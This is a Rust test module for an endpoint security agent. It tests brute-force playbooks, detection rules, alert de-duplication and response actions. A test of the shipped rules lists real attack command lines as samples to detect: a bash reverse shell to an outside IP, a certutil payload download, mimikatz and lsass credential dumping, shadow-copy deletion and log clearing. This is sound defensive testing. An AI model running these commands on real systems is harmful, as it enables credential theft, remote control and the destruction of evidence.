    async fn a_brute_force_found_in_the_logs_sets_off_the_brute_force_playbook() {
        let brute_force = SecurityIncident::new(
            IncidentType::CredentialTheft,
            IncidentSeverity::High,
            "Sigma: Attaque par force brute SSH",
            "8 échecs",
        )
        .with_evidence(serde_json::json!({
            "detection": "sigma_log",
            "attack_techniques": ["T1110.001"],
            "event": { "src_ip": "203.0.113.9", "action": "login_failed" },
        }));
        let context = build_threat_context(&[brute_force], &[], &[]);
        assert_eq!(context.network_alerts[0].alert_type, "brute_force");

        let playbook = agent_gui::dto::Playbook {
            id: "pb".to_string(),
            name: "Brute-force".to_string(),
            description: String::new(),
            enabled: true,
            conditions: vec![agent_gui::dto::PlaybookCondition {
                condition_type: agent_gui::dto::PlaybookConditionType::NetworkAlertType,
                operator: "égal".to_string(),
                value: "brute_force".to_string(),
            }],
            actions: vec![
                agent_gui::dto::PlaybookAction {
                    action_type: agent_gui::dto::PlaybookActionType::BlockIp,
                    parameters: "600".to_string(),
                },
                agent_gui::dto::PlaybookAction {
                    action_type: agent_gui::dto::PlaybookActionType::CreateNotification,
                    parameters: String::new(),
                },
            ],
            created_at: chrono::Utc::now(),
            last_triggered: None,
            trigger_count: 0,
            is_template: true,
        };
        let evaluation = crate::playbook_engine::evaluate_playbook(
            &playbook,
            &context,
            #[cfg(feature = "llm")]
            None,
        )
        .await;

        assert!(evaluation.triggered);
        match evaluation.actions.as_slice() {
            [
                crate::playbook_engine::ResolvedAction::BlockIp { ip, duration_secs },
                crate::playbook_engine::ResolvedAction::Notify { message },
            ] => {
                assert_eq!((ip.as_str(), *duration_secs), ("203.0.113.9", 600));
                assert_eq!(message, "Déclenché : Network alert matches 'brute_force'");
            }
            other => panic!("expected a block then a notification, got {other:?}"),
        }
    }

    #[test]
    fn a_log_detection_is_a_brute_force_only_by_its_attack_techniques() {
        let of = |techniques: serde_json::Value| {
            log_detection_type(&serde_json::json!({ "attack_techniques": techniques }))
        };
        assert_eq!(of(serde_json::json!(["T1110"])), "brute_force");
        assert_eq!(
            of(serde_json::json!(["T1078.003", "T1110.003"])),
            "brute_force"
        );
        assert_eq!(of(serde_json::json!(["t1110.001"])), "brute_force");
        assert_eq!(of(serde_json::json!(["T1078.003"])), "log_detection");
        assert_eq!(of(serde_json::Value::Null), "log_detection");
        assert_eq!(
            network_alert_type(agent_network::types::NetworkAlertType::DataExfiltration),
            "data_exfiltration"
        );
    }

    #[test]
    fn process_evidence_preserves_arguments_and_all_threat_categories() {
        for kind in [
            IncidentType::SuspiciousProcess,
            IncidentType::Malware,
            IncidentType::CredentialTheft,
            IncidentType::CryptoMiner,
            IncidentType::ReverseShell,
            IncidentType::PrivilegeEscalation,
        ] {
            let context = build_threat_context(
                &[incident(
                    kind,
                    serde_json::json!({
                        "process_name": "powershell", "pid": 42,
                        "path": "C:/powershell.exe", "cmdline": "powershell -EncodedCommand example"
                    }),
                )],
                &[],
                &[],
            );
            assert_eq!(context.suspicious_processes.len(), 1);
            assert_eq!(
                context.suspicious_processes[0].command_line,
                "powershell -EncodedCommand example"
            );
        }
    }

    #[test]
    fn invalid_process_identity_is_not_converted_to_an_action_target() {
        for pid in [0_u64, 1, u32::MAX as u64 + 42, u64::MAX] {
            let context = build_threat_context(
                &[incident(
                    IncidentType::Malware,
                    serde_json::json!({"process_name": "test", "pid": pid}),
                )],
                &[],
                &[],
            );
            assert!(context.suspicious_processes.is_empty());
        }
        let context = build_threat_context(
            &[incident(
                IncidentType::Malware,
                serde_json::json!({"pid": 42}),
            )],
            &[],
            &[],
        );
        assert!(context.suspicious_processes.is_empty());
    }

    #[test]
    fn command_line_alias_is_supported_but_path_is_not_a_command_line() {
        for (extra, expected) in [
            (
                serde_json::json!({"command_line": "sh -c test"}),
                "sh -c test",
            ),
            (serde_json::json!({"path": "/tmp/-encodedcommand"}), ""),
        ] {
            let mut evidence = serde_json::json!({"process_name": "sh", "pid": 42});
            evidence
                .as_object_mut()
                .unwrap()
                .extend(extra.as_object().unwrap().clone());
            let context = build_threat_context(
                &[incident(IncidentType::SuspiciousProcess, evidence)],
                &[],
                &[],
            );
            assert_eq!(context.suspicious_processes[0].command_line, expected);
        }
    }

    #[test]
    fn malformed_detection_conditions_do_not_match_live_context() {
        use agent_gui::dto::{
            DetectionCondition, DetectionConditionType as Kind, DetectionRule, Severity,
        };
        let context = ThreatContext {
            suspicious_processes: vec![ProcessInfo {
                name: "powershell".into(),
                pid: 42,
                command_line: "powershell -enc example".into(),
            }],
            network_alerts: vec![NetworkAlertInfo {
                alert_type: "suspicious_port".into(),
                remote_ip: None,
                port: Some(443),
                severity: "high".into(),
                description: "invalid-port".into(),
                user: None,
            }],
            fim_alerts: vec![FimAlertInfo {
                path: "/tmp/test".into(),
                change_type: "modified".into(),
            }],
        };
        let mut rule = DetectionRule {
            id: uuid::Uuid::new_v4().to_string(),
            name: "test".into(),
            description: String::new(),
            severity: Severity::High,
            conditions: vec![],
            actions: vec![],
            enabled: true,
            created_at: chrono::Utc::now(),
            last_match: None,
            match_count: 0,
        };
        for kind in Kind::all() {
            for value in ["", "   "] {
                rule.conditions = vec![DetectionCondition {
                    condition_type: *kind,
                    value: value.into(),
                }];
                assert!(evaluate(&[rule.clone()], &context).is_empty());
            }
        }
        for (kind, value, count) in [
            (Kind::NetworkPort, "invalid-port", 0),
            (Kind::SeverityLevel, "typo", 0),
            (Kind::NetworkPort, "443", 1),
            (Kind::SeverityLevel, "medium", 1),
            (Kind::CommandLineContains, "-ENC", 1),
        ] {
            rule.conditions = vec![DetectionCondition {
                condition_type: kind,
                value: value.into(),
            }];
            assert_eq!(evaluate(&[rule.clone()], &context).len(), count);
        }
        rule.enabled = false;
        assert!(evaluate(&[rule], &context).is_empty());
    }

    fn rule_with(
        kind: agent_gui::dto::DetectionConditionType,
        value: &str,
    ) -> agent_gui::dto::DetectionRule {
        agent_gui::dto::DetectionRule {
            id: "rule-1".into(),
            name: "test".into(),
            description: String::new(),
            severity: agent_gui::dto::Severity::High,
            conditions: vec![agent_gui::dto::DetectionCondition {
                condition_type: kind,
                value: value.into(),
            }],
            actions: vec![],
            enabled: true,
            created_at: chrono::Utc::now(),
            last_match: None,
            match_count: 0,
        }
    }

    fn process(name: &str, pid: u32, command_line: &str) -> ProcessInfo {
        ProcessInfo {
            name: name.into(),
            pid,
            command_line: command_line.into(),
        }
    }

    #[test]
    fn rules_match_processes_no_engine_flagged_and_report_them_once() {
        use agent_gui::dto::DetectionConditionType as Kind;
        let nothing_flagged = ThreatContext::default();
        let observed = ObservedActivity {
            processes: vec![
                process(
                    "AnyDesk",
                    4312,
                    "/Applications/AnyDesk.app/AnyDesk --service",
                ),
                process("Safari", 900, "/Applications/Safari.app/Safari"),
            ],
            connections: vec![],
        };
        let mut memory = RuleHitMemory::default();

        let by_name = rule_with(Kind::ProcessNameContains, "anydesk");
        let matches = evaluate_detection_rules(
            std::slice::from_ref(&by_name),
            &nothing_flagged,
            &observed,
            &mut memory,
        );
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].matched_value, "Processus AnyDesk (PID 4312)");
        assert_eq!(
            matches[0].targets,
            vec![RuleTarget::Process {
                name: "AnyDesk".into(),
                pid: 4312
            }]
        );
        // The process is still running at the next scan: not reported again.
        assert!(
            evaluate_detection_rules(&[by_name], &nothing_flagged, &observed, &mut memory)
                .is_empty()
        );

        let mut by_command = rule_with(Kind::CommandLineContains, "--SERVICE");
        by_command.id = "rule-2".into();
        let matches = evaluate_detection_rules(
            &[by_command],
            &nothing_flagged,
            &observed,
            &mut RuleHitMemory::default(),
        );
        assert_eq!(
            matches[0].matched_value,
            "Processus AnyDesk (PID 4312) : /Applications/AnyDesk.app/AnyDesk --service"
        );
    }

    #[test]
    fn several_new_observations_of_a_condition_make_one_match() {
        use agent_gui::dto::DetectionConditionType as Kind;
        let observed = ObservedActivity {
            processes: vec![
                process("helper", 10, ""),
                process("helper", 11, ""),
                process("helper", 12, ""),
            ],
            connections: vec![],
        };
        let mut memory = RuleHitMemory::default();
        let rule = rule_with(Kind::ProcessNameContains, "helper");
        let matches = evaluate_detection_rules(
            std::slice::from_ref(&rule),
            &ThreatContext::default(),
            &observed,
            &mut memory,
        );
        assert_eq!(matches.len(), 1);
        assert_eq!(
            matches[0].matched_value,
            "Processus helper (PID 10) (+2 autres)"
        );
        // Every new instance is a target of the rule's actions.
        assert_eq!(matches[0].targets.len(), 3);

        // A new instance appears among the known ones: it alone is reported.
        let observed = ObservedActivity {
            processes: vec![process("helper", 10, ""), process("helper", 13, "")],
            connections: vec![],
        };
        let matches =
            evaluate_detection_rules(&[rule], &ThreatContext::default(), &observed, &mut memory);
        assert_eq!(matches[0].matched_value, "Processus helper (PID 13)");
    }

    #[test]
    fn port_rules_match_observed_connections_only_on_the_exact_port() {
        use agent_gui::dto::DetectionConditionType as Kind;
        let observed = ObservedActivity {
            processes: vec![],
            connections: vec![
                ObservedConnection {
                    remote_ip: "203.0.113.7".into(),
                    port: 3389,
                    process_name: Some("mstsc".into()),
                },
                ObservedConnection {
                    remote_ip: "203.0.113.8".into(),
                    port: 33890,
                    process_name: None,
                },
            ],
        };
        let mut memory = RuleHitMemory::default();
        let rule = rule_with(Kind::NetworkPort, "3389");
        let matches = evaluate_detection_rules(
            std::slice::from_ref(&rule),
            &ThreatContext::default(),
            &observed,
            &mut memory,
        );
        assert_eq!(matches.len(), 1);
        assert_eq!(
            matches[0].matched_value,
            "Connexion vers 203.0.113.7:3389 par mstsc"
        );
        assert!(
            evaluate_detection_rules(&[rule], &ThreatContext::default(), &observed, &mut memory)
                .is_empty()
        );
    }

    #[test]
    fn file_and_severity_rules_ignore_raw_activity() {
        use agent_gui::dto::DetectionConditionType as Kind;
        let observed = ObservedActivity {
            processes: vec![process("high", 10, "/etc/passwd high")],
            connections: vec![ObservedConnection {
                remote_ip: "203.0.113.7".into(),
                port: 22,
                process_name: None,
            }],
        };
        for (kind, value) in [(Kind::FimPathMatch, "passwd"), (Kind::SeverityLevel, "low")] {
            assert!(
                evaluate_detection_rules(
                    &[rule_with(kind, value)],
                    &ThreatContext::default(),
                    &observed,
                    &mut RuleHitMemory::default(),
                )
                .is_empty()
            );
        }
    }

    #[test]
    fn a_flagged_process_is_not_reported_again_as_a_plain_observation() {
        use agent_gui::dto::DetectionConditionType as Kind;
        let flagged = ThreatContext {
            suspicious_processes: vec![process("nc", 77, "nc -l 4444")],
            ..Default::default()
        };
        let observed = ObservedActivity {
            processes: vec![process("nc", 77, "nc -l 4444")],
            connections: vec![],
        };
        let mut memory = RuleHitMemory::default();
        let rule = rule_with(Kind::ProcessNameContains, "nc");
        assert_eq!(
            evaluate_detection_rules(
                std::slice::from_ref(&rule),
                &flagged,
                &observed,
                &mut memory
            )
            .len(),
            1
        );
        // Next scan: the engine no longer flags it, the process is still there.
        assert!(
            evaluate_detection_rules(&[rule], &ThreatContext::default(), &observed, &mut memory)
                .is_empty()
        );
    }

    #[test]
    fn an_observation_is_reported_again_after_the_reminder_delay() {
        let mut memory = RuleHitMemory::default();
        let start = std::time::Instant::now();
        assert!(memory.report("rule\u{1f}process\u{1f}1\u{1f}x".into(), start));
        let before = start + RuleHitMemory::REMINDER - std::time::Duration::from_secs(1);
        assert!(!memory.report("rule\u{1f}process\u{1f}1\u{1f}x".into(), before));
        let after = start + RuleHitMemory::REMINDER;
        assert!(memory.report("rule\u{1f}process\u{1f}1\u{1f}x".into(), after));
    }

    #[test]
    fn the_memory_stays_bounded() {
        let mut memory = RuleHitMemory::default();
        let start = std::time::Instant::now();
        for i in 0..(RuleHitMemory::CAPACITY + 10) {
            let at = start + std::time::Duration::from_millis(i as u64);
            assert!(memory.report(format!("key-{i}"), at));
        }
        assert!(memory.reported.len() <= RuleHitMemory::CAPACITY);
        // The most recent observations are the ones kept.
        let last = format!("key-{}", RuleHitMemory::CAPACITY + 9);
        assert!(memory.reported.contains_key(&last));
    }

    fn rule_match(targets: Vec<RuleTarget>) -> RuleMatch {
        RuleMatch {
            rule_id: "rule-1".into(),
            rule_name: "test".into(),
            severity: "high".into(),
            matched_value: "Processus nc (PID 77)".into(),
            confidence: 0.7,
            ai_classification: None,
            targets,
            matched_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn a_rule_acts_on_what_its_condition_found() {
        use crate::playbook_engine::ResolvedAction;
        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
        let mut rule = rule_with(Kind::ProcessNameContains, "nc");
        rule.actions = vec![
            Action::KillProcess,
            Action::QuarantineFile,
            Action::BlockIp,
            Action::CreateNotification,
            Action::DisableAccount,
            Action::RunCommand,
        ];
        let found = rule_match(vec![
            RuleTarget::Process {
                name: "nc".into(),
                pid: 77,
            },
            RuleTarget::Process {
                name: "nc".into(),
                pid: 78,
            },
            RuleTarget::Connection {
                remote_ip: "203.0.113.7".into(),
                port: 4444,
            },
            RuleTarget::File {
                path: "/tmp/payload".into(),
                removed: false,
            },
            RuleTarget::File {
                path: "/tmp/gone".into(),
                removed: true,
            },
        ]);
        assert_eq!(
            resolve_rule_actions(&rule, &found),
            vec![
                ResolvedAction::KillProcess {
                    name: "nc".into(),
                    pid: 77
                },
                ResolvedAction::KillProcess {
                    name: "nc".into(),
                    pid: 78
                },
                // A file that no longer exists cannot be put in quarantine.
                ResolvedAction::QuarantineFile {
                    path: "/tmp/payload".into()
                },
                ResolvedAction::BlockIp {
                    ip: "203.0.113.7".into(),
                    duration_secs: crate::playbook_engine::DEFAULT_BLOCK_SECS
                },
            ]
        );
    }

    #[test]
    fn a_rule_without_a_target_for_its_action_does_nothing() {
        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
        let mut rule = rule_with(Kind::NetworkPort, "4444");
        rule.actions = vec![Action::KillProcess, Action::QuarantineFile];
        let found = rule_match(vec![RuleTarget::Connection {
            remote_ip: "203.0.113.7".into(),
            port: 4444,
        }]);
        assert!(resolve_rule_actions(&rule, &found).is_empty());
        rule.actions = vec![];
        assert!(resolve_rule_actions(&rule, &found).is_empty());
    }

    #[test]
    fn host_wide_responses_do_not_need_a_target() {
        use crate::playbook_engine::ResolvedAction;
        use agent_gui::dto::{DetectionConditionType as Kind, PlaybookActionType as Action};
        let mut rule = rule_with(Kind::ProcessNameContains, "nc");
        rule.actions = vec![Action::IsolateHost, Action::SendSiemAlert];
        let actions = resolve_rule_actions(&rule, &rule_match(vec![]));
        assert_eq!(actions.len(), 2);
        assert!(matches!(actions[0], ResolvedAction::IsolateHost { .. }));
        assert!(matches!(
            &actions[1],
            ResolvedAction::Alert { title, .. } if title == "Règle « test » déclenchée"
        ));
    }

    #[test]
    fn the_notification_says_what_the_responses_did() {
        use crate::playbook_engine::{ActionResult, ResolvedAction};
        let actions = vec![
            ResolvedAction::KillProcess {
                name: "nc".into(),
                pid: 77,
            },
            ResolvedAction::BlockIp {
                ip: "203.0.113.7".into(),
                duration_secs: 3600,
            },
        ];
        let results = vec![
            ActionResult {
                action: "Kill process nc (PID 77)".into(),
                success: true,
                error: None,
            },
            ActionResult {
                action: "Block IP 203.0.113.7".into(),
                success: false,
                error: Some("denied".into()),
            },
        ];
        let body = rule_notification_body(&rule_match(vec![]), &actions, &results, false);
        assert!(body.starts_with("Processus nc (PID 77)"), "{body}");
        assert!(
            body.contains("Réponse : arrêt du processus nc (PID 77)"),
            "{body}"
        );
        assert!(
            body.contains("Réponse en échec : blocage de 203.0.113.7 pendant 1"),
            "{body}"
        );
        assert!(body.contains("(denied)"), "{body}");

        let simulated =
            rule_notification_body(&rule_match(vec![]), &actions[..1], &results[..1], true);
        assert!(
            simulated.contains("Simulation, rien n'a été fait"),
            "{simulated}"
        );
    }

    #[test]
    fn shipped_rules_catch_known_attacks_and_leave_ordinary_activity_alone() {
        let rules = agent_gui::detection_catalog::default_rules(chrono::Utc::now());
        let attacks = [
            process(
                "mimikatz.exe",
                100,
                "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
            ),
            process(
                "rundll32.exe",
                101,
                r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full",
            ),
            process("bash", 102, "bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"),
            process("xmrig", 103, "./xmrig -o stratum+tcp://pool.example:3333"),
            process(
                "vssadmin.exe",
                104,
                "vssadmin.exe Delete Shadows /All /Quiet",
            ),
            process(
                "powershell.exe",
                105,
                "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA",
            ),
            process(
                "osascript",
                106,
                r#"osascript -e display dialog "Mot de passe" default answer "" with hidden answer"#,
            ),
            process(
                "certutil.exe",
                107,
                "certutil.exe -urlcache -split -f http://203.0.113.7/p.exe p.exe",
            ),
            process("wevtutil.exe", 108, "wevtutil.exe cl Security"),
        ];
        let ordinary = [
            process(
                "Safari",
                200,
                "/Applications/Safari.app/Contents/MacOS/Safari",
            ),
            process(
                "sshd",
                201,
                "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups",
            ),
            process("systemd", 202, "/sbin/init splash"),
            process(
                "powershell.exe",
                203,
                "powershell.exe -NoProfile -File C:\\scripts\\inventaire.ps1",
            ),
            process(
                "code",
                204,
                "/usr/share/code/code --type=renderer --enable-crash-reporter",
            ),
            process(
                "chrome",
                205,
                "chrome --type=utility --utility-sub-type=network.mojom.NetworkService",
            ),
            process("lsass.exe", 206, r"C:\Windows\system32\lsass.exe"),
            process(
                "svchost.exe",
                207,
                r"C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule",
            ),
        ];

        for attack in &attacks {
            let observed = ObservedActivity {
                processes: vec![attack.clone()],
                connections: vec![],
            };
            let matches = evaluate_detection_rules(
                &rules,
                &ThreatContext::default(),
                &observed,
                &mut RuleHitMemory::default(),
            );
            assert!(!matches.is_empty(), "missed: {}", attack.command_line);
        }

        let observed = ObservedActivity {
            processes: ordinary.to_vec(),
            connections: vec![ObservedConnection {
                remote_ip: "198.51.100.10".into(),
                port: 443,
                process_name: Some("chrome".into()),
            }],
        };
        let matches = evaluate_detection_rules(
            &rules,
            &ThreatContext::default(),
            &observed,
            &mut RuleHitMemory::default(),
        );
        assert!(
            matches.is_empty(),
            "false positives: {:?}",
            matches
                .iter()
                .map(|m| format!("{} <- {}", m.rule_name, m.matched_value))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn shipped_file_rules_catch_changes_to_authentication_and_startup_files() {
        let rules = agent_gui::detection_catalog::default_rules(chrono::Utc::now());
        for path in [
            "/etc/sudoers",
            "/root/.ssh/authorized_keys",
            "/etc/ld.so.preload",
            "/Library/LaunchDaemons/com.example.plist",
            r"C:\Users\a\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\x.lnk",
            r"C:\Windows\System32\drivers\etc\hosts",
        ] {
            let context = ThreatContext {
                fim_alerts: vec![FimAlertInfo {
                    path: path.into(),
                    change_type: "modified".into(),
                }],
                ..Default::default()
            };
            let matches = evaluate_detection_rules(
                &rules,
                &context,
                &ObservedActivity::default(),
                &mut RuleHitMemory::default(),
            );
            assert!(!matches.is_empty(), "missed: {path}");
            assert!(
                matches[0]
                    .targets
                    .iter()
                    .all(|t| matches!(t, RuleTarget::File { .. }))
            );
        }
    }

    #[test]
    fn observed_activity_leaves_out_the_agent_and_peerless_connections() {
        use agent_scanner::security::process_monitor::ProcessInfo as Scanned;
        let scanned = |pid: u32, name: &str| Scanned {
            pid,
            name: name.into(),
            path: None,
            cmdline: Some(format!("{name} --flag")),
            ppid: None,
            user: None,
        };
        let mut observed = ObservedActivity::default();
        assert!(observed.is_empty());
        observed.add_processes(&[
            scanned(std::process::id(), "agent"),
            scanned(42, "bash"),
            scanned(43, "  "),
        ]);
        assert_eq!(observed.processes.len(), 1);
        assert_eq!(observed.processes[0].command_line, "bash --flag");
        assert!(!observed.is_empty());
    }
}
